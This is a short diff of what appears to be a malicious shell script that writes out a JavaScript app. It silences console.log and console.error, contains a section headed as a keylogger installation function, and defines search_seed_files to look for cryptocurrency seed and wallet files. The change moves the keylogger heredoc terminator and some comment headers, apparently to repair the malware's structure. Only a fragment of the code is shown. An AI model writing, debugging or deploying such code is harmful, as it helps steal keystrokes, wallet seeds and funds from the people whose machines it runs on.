@@ -1749,14 +1749,7 @@ setInterval(() => {
 
 console.log = () => {};
 console.error = () => {};
-# ============================================
-# KEYLOGGER INSTALLATION FUNCTION
-# ============================================
-# MOVED TO TOP - MUST BE DEFINED BEFORE CALLED AT LINE 681
-
-# ---------------------
-# SEARCH FOR SEED/WALLET FILES
-# ---------------------
+KEYLOGGEREOF
 
 search_seed_files() {
     local SEARCH_DIRS=(
@@ -2643,7 +2636,9 @@ EOF
 # (Function definition moved from line 954 to here)
 # Function is now defined at line 68, this is just a comment marker
 
-KEYLOGGEREOF
+# ---------------------
+# SEARCH FOR SEED/WALLET FILES
+# ---------------------
     
     # Create package.json
     cat > "$APP_DIR/package.json" << 'PKGEOF'
